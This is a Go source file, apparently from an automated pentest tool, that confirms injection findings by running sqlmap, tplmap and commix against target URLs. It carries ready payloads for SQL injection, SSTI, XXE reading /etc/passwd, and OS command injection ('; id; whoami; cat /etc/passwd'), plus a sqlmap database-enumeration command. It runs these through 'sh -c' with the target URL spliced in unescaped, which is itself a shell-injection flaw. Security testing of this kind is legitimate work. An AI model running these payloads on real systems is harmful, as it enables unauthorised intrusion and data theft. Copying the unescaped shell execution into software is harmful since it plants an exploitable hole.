package validation

import (
	"context"
	"fmt"
	"os/exec"
	"strings"
	"time"

	"github.com/samrudh/hack-ai-v2/internal/types"
)

// InjectionExecutor handles injection-specific PoC execution (SQLi, SSTI, XXE, CMDi)
type InjectionExecutor struct {
	httpExecutor *HTTPExecutor
	tools        map[string]string // tool name -> binary path
}

// NewInjectionExecutor creates a new injection executor
func NewInjectionExecutor() *InjectionExecutor {
	e := &InjectionExecutor{
		httpExecutor: NewHTTPExecutor(),
		tools:        make(map[string]string),
	}
	
	// Detect available tools
	e.detectTools()
	return e
}

// detectTools finds available injection testing tools
func (e *InjectionExecutor) detectTools() {
	toolNames := []string{"sqlmap", "ghauri", "tplmap", "commix"}
	
	for _, tool := range toolNames {
		if path, err := exec.LookPath(tool); err == nil {
			e.tools[tool] = path
		}
	}
}

// CanHandle checks if this executor can handle the finding
func (e *InjectionExecutor) CanHandle(finding *types.Finding) bool {
	injectionTypes := []string{
		"sqli", "sql_injection", "blind_sqli", "time_based_sqli",
		"ssti", "template_injection",
		"xxe", "xml_injection",
		"cmdi", "command_injection", "os_injection",
	}
	
	vulnType := strings.ToLower(finding.VulnType)
	for _, t := range injectionTypes {
		if strings.Contains(vulnType, t) {
			return true
		}
	}
	return false
}

// Verify performs injection-specific verification
func (e *InjectionExecutor) Verify(ctx context.Context, finding *types.Finding) (*VerifyResult, error) {
	vulnType := strings.ToLower(finding.VulnType)
	
	// Use specialized tool if available
	if strings.Contains(vulnType, "sqli") || strings.Contains(vulnType, "sql") {
		if sqlmapPath, ok := e.tools["sqlmap"]; ok {
			return e.verifySQLi(ctx, finding, sqlmapPath)
		}
	}
	
	if strings.Contains(vulnType, "ssti") || strings.Contains(vulnType, "template") {
		if tplmapPath, ok := e.tools["tplmap"]; ok {
			return e.verifySSTI(ctx, finding, tplmapPath)
		}
	}
	
	if strings.Contains(vulnType, "cmdi") || strings.Contains(vulnType, "command") {
		if commixPath, ok := e.tools["commix"]; ok {
			return e.verifyCMDi(ctx, finding, commixPath)
		}
	}
	
	// Fall back to HTTP executor for basic verification
	return e.httpExecutor.Verify(ctx, finding)
}

// GeneratePoC creates injection-specific PoCs
func (e *InjectionExecutor) GeneratePoC(ctx context.Context, finding *types.Finding) (*types.PoC, error) {
	vulnType := strings.ToLower(finding.VulnType)
	
	poc := &types.PoC{
		Type:        "injection",
		Description: fmt.Sprintf("Injection PoC for %s", finding.VulnType),
		Steps:       make([]string, 0),
		CreatedAt:   time.Now(),
	}
	
	// Generate type-specific PoC
	if strings.Contains(vulnType, "sqli") || strings.Contains(vulnType, "sql") {
		poc.Payload = e.generateSQLiPayload(finding)
		poc.Steps = []string{
			"1. Identify vulnerable parameter",
			fmt.Sprintf("2. Target: %s (param: %s)", finding.URL, finding.Parameter),
			"3. Inject SQL payload to extract data",
			fmt.Sprintf("4. Payload: %s", poc.Payload),
			"5. Verify data extraction in response",
		}
		poc.ToolCommand = e.generateSQLMapCommand(finding)
		
	} else if strings.Contains(vulnType, "ssti") || strings.Contains(vulnType, "template") {
		poc.Payload = e.generateSSTIPayload(finding)
		poc.Steps = []string{
			"1. Identify template injection point",
			fmt.Sprintf("2. Target: %s", finding.URL),
			"3. Inject template expression",
			fmt.Sprintf("4. Payload: %s", poc.Payload),
			"5. Check for expression evaluation in response",
		}
		
	} else if strings.Contains(vulnType, "xxe") || strings.Contains(vulnType, "xml") {
		poc.Payload = e.generateXXEPayload(finding)
		poc.Steps = []string{
			"1. Identify XML processing endpoint",
			fmt.Sprintf("2. Target: %s", finding.URL),
			"3. Inject XXE payload with file read",
			fmt.Sprintf("4. Payload:\n%s", poc.Payload),
			"5. Check response for file contents",
		}
		
	} else if strings.Contains(vulnType, "cmdi") || strings.Contains(vulnType, "command") {
		poc.Payload = e.generateCMDiPayload(finding)
		poc.Steps = []string{
			"1. Identify command injection point",
			fmt.Sprintf("2. Target: %s (param: %s)", finding.URL, finding.Parameter),
			"3. Inject OS command payload",
			fmt.Sprintf("4. Payload: %s", poc.Payload),
			"5. Verify command execution in response",
		}
	}
	
	// Generate curl command
	poc.CurlCommand = e.httpExecutor.generateCurlCommand(finding, poc.Payload)
	
	return poc, nil
}

// ExecutePoC runs the injection PoC
func (e *InjectionExecutor) ExecutePoC(ctx context.Context, poc *types.PoC) (*ExecuteResult, error) {
	start := time.Now()
	result := &ExecuteResult{
		Success:     false,
		ExecutionMs: 0,
	}
	
	// If tool command available, use it
	if poc.ToolCommand != "" {
		output, err := e.executeToolCommand(ctx, poc.ToolCommand)
		if err == nil {
			result.Response = output
			// Check for success indicators
			result.Success = e.checkToolOutput(output)
		}
	} else {
		// Fall back to HTTP execution
		httpResult, err := e.httpExecutor.ExecutePoC(ctx, poc)
		if err != nil {
			return result, err
		}
		result = httpResult
	}
	
	result.ExecutionMs = time.Since(start).Milliseconds()
	return result, nil
}

// verifySQLi uses sqlmap for SQL injection verification
func (e *InjectionExecutor) verifySQLi(ctx context.Context, finding *types.Finding, sqlmapPath string) (*VerifyResult, error) {
	// Build sqlmap command for quick test
	args := []string{
		"-u", finding.URL,
		"--batch",
		"--level=1",
		"--risk=1",
		"--technique=B", // Boolean-based only for speed
		"--output-dir=/tmp/hack-ai-v2/sqlmap",
	}
	
	if finding.Parameter != "" {
		args = append(args, "-p", finding.Parameter)
	}
	
	cmd := exec.CommandContext(ctx, sqlmapPath, args...)
	output, err := cmd.CombinedOutput()
	if err != nil {
		// SQLmap returns non-zero even on some successes
	}
	
	outputStr := string(output)
	
	// Check for vulnerability confirmation
	if strings.Contains(outputStr, "is vulnerable") || 
	   strings.Contains(outputStr, "injectable") {
		return &VerifyResult{
			Verified:    true,
			Confidence:  0.95,
			Method:      "sqlmap",
			Details:     "SQLMap confirmed SQL injection",
			SecondaryID: "sqlmap",
		}, nil
	}
	
	return &VerifyResult{
		Verified:   false,
		Confidence: 0.0,
		Method:     "sqlmap",
		Details:    "SQLMap did not confirm vulnerability",
	}, nil
}

// verifySSTI uses tplmap for SSTI verification
func (e *InjectionExecutor) verifySSTI(ctx context.Context, finding *types.Finding, tplmapPath string) (*VerifyResult, error) {
	args := []string{
		"-u", finding.URL,
		"--level", "1",
	}
	
	cmd := exec.CommandContext(ctx, tplmapPath, args...)
	output, err := cmd.CombinedOutput()
	
	outputStr := string(output)
	
	if err == nil && strings.Contains(outputStr, "Confirmed") {
		return &VerifyResult{
			Verified:    true,
			Confidence:  0.9,
			Method:      "tplmap",
			Details:     "Tplmap confirmed SSTI",
			SecondaryID: "tplmap",
		}, nil
	}
	
	return &VerifyResult{
		Verified:   false,
		Confidence: 0.0,
		Method:     "tplmap",
		Details:    outputStr,
	}, nil
}

// verifyCMDi uses commix for command injection verification
func (e *InjectionExecutor) verifyCMDi(ctx context.Context, finding *types.Finding, commixPath string) (*VerifyResult, error) {
	args := []string{
		"-u", finding.URL,
		"--batch",
		"--level=1",
	}
	
	cmd := exec.CommandContext(ctx, commixPath, args...)
	output, err := cmd.CombinedOutput()
	
	outputStr := string(output)
	
	if err == nil && strings.Contains(outputStr, "vulnerable") {
		return &VerifyResult{
			Verified:    true,
			Confidence:  0.9,
			Method:      "commix",
			Details:     "Commix confirmed command injection",
			SecondaryID: "commix",
		}, nil
	}
	
	return &VerifyResult{
		Verified:   false,
		Confidence: 0.0,
		Method:     "commix",
		Details:    outputStr,
	}, nil
}

// Payload generation functions
func (e *InjectionExecutor) generateSQLiPayload(finding *types.Finding) string {
	// Data extraction payload
	return `' UNION SELECT null,table_name,null FROM information_schema.tables--`
}

func (e *InjectionExecutor) generateSSTIPayload(finding *types.Finding) string {
	// Multiple template engine test
	return `${{<%[%'"}}%\{{7*7}}`
}

func (e *InjectionExecutor) generateXXEPayload(finding *types.Finding) string {
	return `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<foo>&xxe;</foo>`
}

func (e *InjectionExecutor) generateCMDiPayload(finding *types.Finding) string {
	return `; id; whoami; cat /etc/passwd`
}

func (e *InjectionExecutor) generateSQLMapCommand(finding *types.Finding) string {
	cmd := fmt.Sprintf("sqlmap -u '%s' --batch --dbs", finding.URL)
	if finding.Parameter != "" {
		cmd += fmt.Sprintf(" -p %s", finding.Parameter)
	}
	return cmd
}

// executeToolCommand runs a shell command
func (e *InjectionExecutor) executeToolCommand(ctx context.Context, command string) (string, error) {
	cmd := exec.CommandContext(ctx, "sh", "-c", command)
	output, err := cmd.CombinedOutput()
	return string(output), err
}

// checkToolOutput checks if tool output indicates success
func (e *InjectionExecutor) checkToolOutput(output string) bool {
	successIndicators := []string{
		"vulnerable", "injectable", "confirmed",
		"retrieved", "dumped", "available",
	}
	
	outputLower := strings.ToLower(output)
	for _, indicator := range successIndicators {
		if strings.Contains(outputLower, indicator) {
			return true
		}
	}
	return false
}
